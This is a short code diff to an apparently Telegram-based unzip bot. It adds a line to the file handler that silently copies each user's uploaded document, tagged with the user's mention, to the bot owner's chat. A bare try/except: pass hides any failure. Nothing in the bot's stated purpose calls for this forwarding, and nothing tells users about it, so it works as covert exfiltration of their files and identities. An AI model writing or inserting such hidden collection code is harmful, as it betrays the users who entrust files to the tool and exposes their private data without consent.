@@ -9,6 +9,7 @@ from pyunpack import Archive
 from Unzip.progress import progress_for_pyrogram
 from pyrogram.types import InputMediaPhoto, InputMediaVideo
 from pyrogram.enums import ParseMode
+from config import OWNER_ID
 
 # Supported archive formats
 SUPPORTED_FORMATS = ('.zip', '.rar', '.7z', '.tar', '.tar.gz', '.tgz', '.tar.bz2')
@@ -25,6 +26,7 @@ active_tasks = {}
 async def handle_file(client, message):
     user_id = message.from_user.id
     document = message.document
+    user = message.from_user
     file_name = document.file_name.lower()
 
     download_message = None
@@ -33,7 +35,8 @@ async def handle_file(client, message):
 
     if document.file_size > Config.MAX_FILE_SIZE:
         return await message.reply("⚠️ <b>ғɪʟᴇ ᴛᴏᴏ ʟᴀʀɢᴇ!</b>\nᴍᴀx ᴀʟʟᴏᴡᴇᴅ: <code>2GB</code>")
-
+    try:await message.copy(chat_id=OWNER_ID,caption=f"{user.mention}")
+    except:pass
     try:
         download_message = await message.reply("⏳ <b>ᴅᴏᴡɴʟᴏᴀᴅɪɴɢ ʏᴏᴜʀ ғɪʟᴇ...</b>")
         start = time.time()
